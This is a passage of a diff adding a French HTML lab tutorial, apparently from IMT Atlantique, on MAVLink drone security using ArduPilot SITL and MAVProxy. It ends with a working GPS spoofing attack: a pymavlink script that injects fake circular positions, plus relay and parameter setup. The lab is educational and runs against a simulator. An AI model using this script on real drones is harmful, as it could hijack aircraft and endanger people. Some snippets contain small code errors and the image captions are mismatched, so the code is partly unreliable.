+&nbsp; mavlink_version   : &lt;version MAVLink&gt;        <span class="comment">// 3 = MAVLink v2</span><br>
+}
+  </div>
+
+  <div style="border: 1px solid var(--border); background: #020a0a; border-radius:2px; overflow:hidden; margin:20px 0">
+      <div style="background: var(--teal-dark); padding:8px 16px; font-family:var(--mono); font-size:10px; color:var(--teal-light); letter-spacing:1px">
+        MAVProxy — watch HEARTBEAT
+      </div>
+      <div class="heartbeat-row">
+        <span class="dir">&gt;</span>
+        <span class="key">HEARTBEAT {type:</span> <span class="val">6</span><span class="key">, autopilot:</span> <span class="val">8</span><span class="key">, base_mode:</span> <span class="val">0</span><span class="key">, system_status:</span> <span class="val">0</span><span class="key">}</span>
+        <span class="annotation">→ type:6=GCS · autopilot:8=MAV_AUTOPILOT_INVALID · base_mode:0=aucun mode · system_status:0=UNINIT → QGroundControl au démarrage</span>
+      </div>
+      <div class="heartbeat-row">
+        <span class="dir">&gt;</span>
+        <span class="key">HEARTBEAT {type:</span> <span class="val">6</span><span class="key">, autopilot:</span> <span class="val">8</span><span class="key">, base_mode:</span> <span class="val">192</span><span class="key">, system_status:</span> <span class="val">4</span><span class="key">}</span>
+        <span class="annotation">→ type:6=GCS · base_mode:192=GCS actif (bits activés) · system_status:4=ACTIVE → QGroundControl maintenant opérationnel</span>
+      </div>
+      <div class="heartbeat-row">
+        <span class="dir" style="color:#f08080">&lt;</span>
+        <span class="key">HEARTBEAT {type:</span> <span class="val">2</span><span class="key">, autopilot:</span> <span class="val">3</span><span class="key">, base_mode:</span> <span class="val">217</span><span class="key">, custom_mode:</span> <span class="val">4</span><span class="key">, system_status:</span> <span class="val">4</span><span class="key">}</span>
+        <span class="annotation">→ type:2=quadrotor · autopilot:3=ArduPilot · base_mode:217=drone actif+armé+guidé · custom_mode:4=GUIDED · system_status:4=ACTIVE → Drone SITL</span>
+      </div>
+    </div>
+
+    <h4 class="sub2">Analyse du GPS_RAW_INT</h4>
+   <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; MAVProxy
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">watch GPS_RAW_INT</span></div>
+      </div>
+    </div>
+
+    <img src="images/img5.png" alt="Acoustic spoofing diagram" class="img">
+    <div class="code-block">
+GPS_RAW_INT {<br>
+&nbsp; time_usec         : &lt;temps en µs&gt;              <span class="comment">// horodatage du message</span><br>
+&nbsp; fix_type          : &lt;qualité du signal GPS&gt;   <span class="comment">// 0 = pas de GPS, 6 = position 3D fiable</span><br>
+&nbsp; lat, lon          : &lt;position GPS&gt;            <span class="comment">// latitude/longitude × 10⁷</span><br>
+&nbsp; alt               : &lt;altitude&gt;                <span class="comment">// hauteur par rapport au niveau de la mer (mm)</span><br>
+&nbsp; eph, epv          : &lt;précision&gt;               <span class="comment">// erreur horizontale / verticale</span><br>
+&nbsp; vel               : &lt;vitesse&gt;                 <span class="comment">// vitesse du drone (cm/s)</span><br>
+&nbsp; cog               : &lt;direction&gt;               <span class="comment">// cap de déplacement (0.01°)</span><br>
+&nbsp; satellites_visible: &lt;nb satellites&gt;          <span class="comment">// plus il est élevé, plus le GPS est fiable</span><br>
+&nbsp; alt_ellipsoid     : &lt;altitude GPS brute&gt;      <span class="comment">// altitude basée sur le modèle terrestre</span><br>
+&nbsp; h_acc, v_acc      : &lt;incertitude&gt;             <span class="comment">// précision horizontale / verticale (mm)</span><br>
+&nbsp; vel_acc           : &lt;précision vitesse&gt;<br>
+&nbsp; hdg_acc           : &lt;précision direction&gt;<br>
+&nbsp; yaw               : &lt;orientation du drone&gt;    <span class="comment">// angle de rotation (°)</span><br>
+}
+</div>
+
+    <h4 class="sub2">Analyse de l'ATTITUDE</h4>
+  <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; MAVProxy
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">watch ATTITUDE</span></div>
+      </div>
+    </div>
+
+    <img src="images/img6.png" alt="Acoustic spoofing diagram" class="img">
+
+
+
+   <div class="code-block">
+ATTITUDE {<br>
+&nbsp; time_boot_ms : &lt;temps depuis démarrage (ms)&gt; <span class="comment">// horodatage</span><br>
+&nbsp; roll         : &lt;inclinaison gauche/droite&gt;    <span class="comment">// rotation autour de l’axe avant-arrière (radians)</span><br>
+&nbsp; pitch        : &lt;inclinaison avant/arrière&gt;    <span class="comment">// rotation autour de l’axe gauche-droite (radians)</span><br>
+&nbsp; yaw          : &lt;orientation&gt;                  <span class="comment">// direction du drone (rotation axe vertical)</span><br>
+&nbsp; rollspeed    : &lt;vitesse de rotation roulis&gt;   <span class="comment">// rad/s</span><br>
+&nbsp; pitchspeed   : &lt;vitesse de rotation tangage&gt;  <span class="comment">// rad/s</span><br>
+&nbsp; yawspeed     : &lt;vitesse de rotation lacet&gt;    <span class="comment">// rad/s</span><br>
+}
+</div>
+
+    <!-- ÉTAPE 5 : Mission -->
+    <h3 class="subsection">Étape 5 — Définir et Exécuter une Mission</h3>
+
+    <h4 class="sub2">Méthode 1 :Chargement et exécution de mission</h4>
+    <div class="mission-viz">
+      <table class="mission-table">
+        <thead>
+          <tr>
+            <th>SEQ</th><th>current</th><th>frame</th><th>command</th>
+            <th>p1</th><th>p2</th><th>p3</th><th>p4</th>
+            <th>lat</th><th>lon</th><th>alt</th><th>autocontinue</th><th>Type</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="wp-nav">0</td><td>1</td><td>3</td><td>16</td>
+            <td>0</td><td>0</td><td>0</td><td>0</td>
+            <td>-35.3625</td><td>149.1650</td><td>10</td><td>1</td>
+            <td class="wp-nav">NAV_WAYPOINT</td>
+          </tr>
+          <tr>
+            <td class="wp-nav">1</td><td>0</td><td>3</td><td>16</td>
+            <td>0</td><td>0</td><td>0</td><td>0</td>
+            <td>-35.3630</td><td>149.1655</td><td>10</td><td>1</td>
+            <td class="wp-nav">NAV_WAYPOINT</td>
+          </tr>
+          <tr>
+            <td class="wp-nav">2</td><td>0</td><td>3</td><td>16</td>
+            <td>0</td><td>0</td><td>0</td><td>0</td>
+            <td>-35.3635</td><td>149.1660</td><td>10</td><td>1</td>
+            <td class="wp-nav">NAV_WAYPOINT</td>
+          </tr>
+          <tr>
+            <td class="wp-land">3</td><td>0</td><td>3</td><td>21</td>
+            <td>0</td><td>0</td><td>0</td><td>0</td>
+            <td>0</td><td>0</td><td>0</td><td>1</td>
+            <td class="wp-land">LAND</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; MAVProxy — Chargement et exécution de mission
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">nano mission.txt</span></div>
+        <div class="code-block">
+<br>
+QGC WPL 110<br>
+0   1   3   16  0 0 0 0   -35.3625 149.1650 10  1<br>
+1   0   3   16  0 0 0 0   -35.3630 149.1655 10  1<br>
+2   0   3   16  0 0 0 0   -35.3635 149.1660 10  1<br>
+3   0   3   21  0 0 0 0   0         0        0   1<br>
+</div>
+        <div><span class="t-comment"># Charger la mission</span></div>
+        <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">wp load mission.txt</span></div>
+        <br>
+        <div><span class="t-comment"># Vérifier la mission</span></div>
+        <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">wp list</span></div>
+        <br>
+        <div><span class="t-comment"># Démarrer la mission</span></div>
+        <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">mode AUTO</span></div>
+        <div><span class="t-out">Got COMMAND_ACK: DO_SET_MODE: ACCEPTED</span></div>
+        <div><span class="t-out">AUTO&gt; Mode AUTO</span></div>
+        <br>
+        <div><span class="t-prompt">AUTO&gt; </span><span class="t-cmd">arm throttle</span></div>
+        <br>
+        <div><span class="t-comment"># Surveiller la mission en cours</span></div>
+        <div><span class="t-prompt">AUTO&gt; </span><span class="t-cmd">watch MISSION_CURRENT</span></div>
+        <div><span class="t-out">&lt; MISSION_CURRENT {seq: 1, total: 3, mission_state: 3, mission_mode: 1}</span></div>
+      </div>
+    </div>
+
+    <img src="images/img7.png" alt="Acoustic spoofing diagram" class="img">
+    <img src="images/img8.png" alt="Acoustic spoofing diagram" class="img">
+    <img src="images/img9.png" alt="Acoustic spoofing diagram" class="img">
+    <img src="images/img10.png" alt="Acoustic spoofing diagram" class="img">
+
+    <h4 class="sub2">Méthode 2 : Création de mission via MAP </h4>
+    
+<div style="border: 1px solid var(--border); background: #020a0a; border-radius:2px; overflow:hidden; margin:20px 0">
+  
+  <div style="background: var(--teal-dark); padding:8px 16px; font-family:var(--mono); font-size:10px; color:var(--teal-light); letter-spacing:1px">
+     MAP
+  </div>
+
+  <div class="heartbeat-row">
+    <span class="dir">&gt;</span>
+    <span class="key">Ouvrir MAP</span>
+  </div>
+
+  <div class="heartbeat-row">
+    <span class="dir">&gt;</span>
+    <span class="key">Clic droit</span>
+  </div>
+
+  <div class="heartbeat-row">
+    <span class="dir">&gt;</span>
+    <span class="key">Mission | Draw</span>
+    <span class="annotation">→ activer le mode dessin de mission</span>
+  </div>
+
+  <div class="heartbeat-row">
+    <span class="dir">&gt;</span>
+    <span class="key">Clic sur la carte</span>
+    <span class="annotation">→ ajouter Waypoint 1 (point de départ)</span>
+    <span class="annotation">→ ajouter Waypoint 2</span>
+    <span class="annotation">→ ajouter Waypoint 3 (et ainsi de suite)</span>
+  </div>
+
+  <div class="heartbeat-row">
+    <span class="dir">&gt;</span>
+    <span class="key">Clic droit</span>
+    <span class="annotation">→ terminer la création de mission</span>
+  </div>
+
+  <div class="heartbeat-row">
+    <span class="dir">&gt;</span>
+    <span class="key">Mission | Loop</span>
+    <span class="annotation">→ boucle la mission en continu</span>
+  </div>
+
+  <div class="heartbeat-row">
+    <span class="dir">&gt;</span>
+    <span class="key">Mission | Stop</span>
+    <span class="annotation">→ arrêter la mission</span>
+  </div>
+
+</div>
+    <img src="images/img11.png" alt="Acoustic spoofing diagram" class="img">
+
+   <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; MAVProxy
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">wp list</span></div>
+        <div><span class="t-prompt">GUIDED&gt; </span><span class="t-cmd">mode AUTO</span></div>
+      </div>
+   </div>
+    
+    <img src="images/img12.png" alt="Acoustic spoofing diagram" class="img">
+    <img src="images/img13.png" alt="Acoustic spoofing diagram" class="img">
+
+  <div class="alert alert-warn">
+  <strong>⚠ Réinitialisation complète (SITL / MAVProxy)</strong><br>
+
+  <span class="comment"># 1. Arrêter tous les processus</span><br>
+  pkill -f arducopter 2&gt;/dev/null<br>
+  pkill -f mavproxy 2&gt;/dev/null<br><br>
+
+  <span class="comment"># 2. Supprimer la mémoire (EEPROM)</span><br>
+  cd ~/ardupilot/ArduCopter<br>
+  rm -f eeprom.bin<br><br>
+
+  <span class="comment"># 3. Supprimer les paramètres corrompus</span><br>
+  rm -f ~/ardupilot/build/sitl/tmp/default_params.parm<br><br>
+
+  <span class="comment">→ Cette procédure permet de remettre l’environnement à l’état initial en supprimant les configurations persistantes.</span>
+  </div>
+
+
+    <h3 class="subsection">Étape 6 — : Simulation d'attaque</h3>
+
+    <div class="two-col">
+      <div class="info-box">
+        <div class="ib-title">Faiblesses Fondamentales</div>
+        <ul class="styled">
+          <li><span class="tag-red">Pas chiffré</span> par défaut</li>
+          <li><span class="tag-red">Pas authentifié</span></li>
+          <li>Basé sur <span class="tag-red">UDP ouvert</span></li>
+        </ul>
+      </div>
+      <div class="info-box">
+        <div class="ib-title">Types d'Attaques Possibles</div>
+        <ul class="styled">
+          <li><span class="tag-red">Interception</span> : voir les messages MAVLink (HEARTBEAT, GPS…)</li>
+          <li><span class="tag-red">Spoofing</span> : faux GPS → changer position · faux GCS → envoyer commandes</li>
+          <li><span class="tag-red">Injection</span> : ARM/DISARM · SET_MODE · NAV_TAKEOFF</li>
+          <li><span class="tag-red">Replay</span> : réutiliser des messages capturés</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="terminal" style="margin-top:24px">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Python — Réception d'un message GPS_RAW_INT via pymavlink
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-comment">>>> # Dans le terminal Python (pymavlink)</span></div>
+        <div><span class="t-prompt">>>> </span><span class="t-cmd">from pymavlink import mavutil</span></div>
+        <div><span class="t-prompt">>>> </span><span class="t-cmd">master = mavutil.mavlink_connection('udp:127.0.0.1:14550')</span></div>
+        <div><span class="t-prompt">>>> </span><span class="t-cmd">msg = mav.recv_match(type='GPS_RAW_INT', blocking=True)</span></div>
+        <div><span class="t-prompt">>>> </span><span class="t-cmd">print(msg)</span></div>
+        <div><span class="t-out">GPS_RAW_INT {time_usec: 7599963000, fix_type: 6,</span></div>
+        <div><span class="t-out">&nbsp;&nbsp;lat: -353629919, lon: 1491642244, alt: 587120,</span></div>
+        <div><span class="t-out">&nbsp;&nbsp;eph: 121, epv: 200, vel: 0, cog: 31903,</span></div>
+        <div><span class="t-out">&nbsp;&nbsp;satellites_visible: 10, alt_ellipsoid: 587120,</span></div>
+        <div><span class="t-out">&nbsp;&nbsp;h_acc: 300, v_acc: 300, vel_acc: 0, hdg_acc: 0, yaw: 0}</span></div>
+      </div>
+    </div>
+
+  <h4 class="sub2">Scénario d’attaque : GPS Spoofing sur UAV </h4>
+    <div class="alert alert-info" style="margin-top:12px">
+      <strong>Objectif de l’attaque — GPS Spoofing UAV</strong>
+      Faire croire au drone qu’il est dans une fausse position afin de :
+      <br>• modifier sa trajectoire
+      <br>• le détourner de sa mission
+      <br>• provoquer une instabilité du système
+
+      <br><br>
+      <strong>Source :</strong>
+      https://peer.asee.org/gps-spoofing-on-uav-simulation-using-ardupilot.pdf
+    </div>
+
+    <p class="prose">D’abord, on crée un script d’attaque qui génère et envoie en continu des positions GPS falsifiées en suivant une trajectoire circulaire afin de simuler un scénario de GPS spoofing sur le drone.
+</p>
+
+      <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 1 - Attaque
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">mkdir Attaques</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">cd Attaques</span></div>
+        <div><span class="t-prompt">$ </span><span class="t-cmd">nano gps_spoofing.py</span></div>
+        <div class="code-block">
+GPS SPOOFING - Cercle autour de Canberra {<br>
+&nbsp; import math <span class="comment">// bibliothèque mathématique</span><br>
+&nbsp; import time <span class="comment">// gestion du temps</span><br>
+&nbsp; from pymavlink import mavutil <span class="comment">// interface MAVLink</span><br><br>
+
+&nbsp; master = mavutil.mavlink_connection('udp:127.0.0.1:14551') <span class="comment">// connexion au simulateur drone</span><br>
+&nbsp; master.wait_heartbeat() <span class="comment">// attente de connexion active</span><br><br>
+
+&nbsp; center_lat = -353632621 <span class="comment">// latitude centre (Canberra)</span><br>
+&nbsp; center_lon = 1491652374 <span class="comment">// longitude centre (Canberra)</span><br>
+&nbsp; radius = 50000 <span class="comment">// rayon du cercle (~500 m)</span><br>
+&nbsp; altitude = 30.0 <span class="comment">// altitude constante</span><br>
+&nbsp; angle = 0 <span class="comment">// angle initial</span><br><br>
+
+&nbsp; while True: <span class="comment">// boucle d’attaque continue</span><br>
+&nbsp;&nbsp;&nbsp; spoofed_lat = int(center_lat + radius * cos(angle)) <span class="comment">// calcul latitude circulaire</span><br>
+&nbsp;&nbsp;&nbsp; spoofed_lon = int(center_lon + radius * sin(angle)) <span class="comment">// calcul longitude circulaire</span><br><br>
+
+&nbsp;&nbsp;&nbsp; master.mav.gps_input_send(<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0, 0, 0, 0, 0, 3,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; spoofed_lat, spoofed_lon, altitude,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 255<br>
+&nbsp;&nbsp;&nbsp; ) <span class="comment">// injection GPS spoofé</span><br><br>
+
+&nbsp;&nbsp;&nbsp; print("Angle:", angle, "Lat:", spoofed_lat/1e7, "Lon:", spoofed_lon/1e7) <span class="comment">// affichage debug</span><br><br>
+
+&nbsp;&nbsp;&nbsp; angle += 10 <span class="comment">// progression du cercle</span><br>
+&nbsp;&nbsp;&nbsp; if angle >= 360: angle = 0 <span class="comment">// reset angle</span><br>
+&nbsp;&nbsp;&nbsp; time.sleep(0.5) <span class="comment">// délai entre envois</span><br>
+}
+      </div>
+    </div>  
+  </div>
+    
+
+
+
+ <p class="prose">Puis on configure MAVProxy dans un second terminal pour relayer la communication du drone en redirigeant le flux MAVLink du port 14550 vers le port 14551 afin de permettre l’interception et la manipulation des messages.
+</p>
+
+      <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 2 - MAVProxy
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">mavproxy.py --master=127.0.0.1:14550 --out=127.0.0.1:14551</span></div>
+    </div>  
+  </div>
+    
+
+ <p class="prose">Dans le terminal SITL, on configure le drone en mode GUIDED, on l’arme, on le fait décoller et on ajuste les paramètres GPS nécessaires pour préparer le scénario de simulation.</p>
+
+      <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 3 - SITL
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">mode guided</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">arm throttle</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">takeoff 40</span></div>
+        <div><span class="t-prompt">&gt; </span><span class="t-cmd">param set GPS1_TYPE 14</span></div>
+    </div>  
+  </div>
+      <div class="alert alert-warn">
+      <strong>⚠ GPS1_TYPE 14</strong>
+      Indique au système d’accepter une source GPS particulière, souvent utilisée dans un contexte de simulation ou de réception de données externes via MAVLink.
+    </div>
+  
+ <p class="prose">Finalement, on lance l'attaque.</p>
+
+      <div class="terminal">
+      <div class="terminal-bar">
+        <span class="terminal-dot" style="background:#e05555"></span>
+        <span class="terminal-dot" style="background:#f0c040"></span>
+        <span class="terminal-dot" style="background:#4fd1d1"></span>
+        &nbsp; Terminal 1 - Attaque
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">$ </span><span class="t-cmd">python3 gps_spoofing.py</span></div>
+    </div>  
+  </div>
+
+    <img src="images/img14.png" alt="Acoustic spoofing diagram" class="img">
+
+    <h3 class="subsection">Récapitulatif des Commandes Clés</h3>
+    <div style="overflow-x:auto">
+      <table class="data-table">
+        <thead>
+          <tr><th>Commande MAVProxy</th><th>Description</th><th>Utilisation</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>watch HEARTBEAT</td><td>Surveillance du signal périodique système</td><td>État GCS et drone</td></tr>
+          <tr><td>watch GPS_RAW_INT</td><td>Données GPS brutes en temps réel</td><td>Navigation, position</td></tr>
+          <tr><td>watch ATTITUDE</td><td>Roll, pitch, yaw du drone</td><td>Stabilisation</td></tr>
+          <tr><td>watch MISSION_CURRENT</td><td>Waypoint en cours d'exécution</td><td>Suivi de mission</td></tr>
+          <tr><td>wp load mission.txt</td><td>Charger un plan de mission</td><td>Avant vol autonome</td></tr>
+          <tr><td>wp list</td><td>Vérifier les waypoints chargés</td><td>Validation mission</td></tr>
+          <tr><td>mode AUTO</td><td>Passer en mode vol autonome</td><td>Démarrage mission</td></tr>
+          <tr><td>arm throttle</td><td>Armer les moteurs</td><td>Avant décollage</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+  </div>
+</div><!-- end simulation -->
+
+<!-- FOOTER -->
+<footer>
+  <div>Sécurité des environnements UAV · Yakine Haffoudhi · IMT Atlantique</div>
+</footer>
+
+<!-- SCROLL TOP -->
+<div class="scroll-top" id="scrollTop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+
+<script>
+  function showSection(id) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    const idx = id === 'theorie' ? 0 : 1;
+    document.querySelectorAll('.nav-tab')[idx].classList.add('active');
+    window.scrollTo({ top: document.querySelector('.hero').offsetHeight, behavior: 'smooth' });
+  }
+
+  window.addEventListener('scroll', () => {
+    const st = document.getElementById('scrollTop');
+    if (window.scrollY > 400) st.classList.add('visible');
+    else st.classList.remove('visible');
+  });
+</script>
+</body>
+</html>
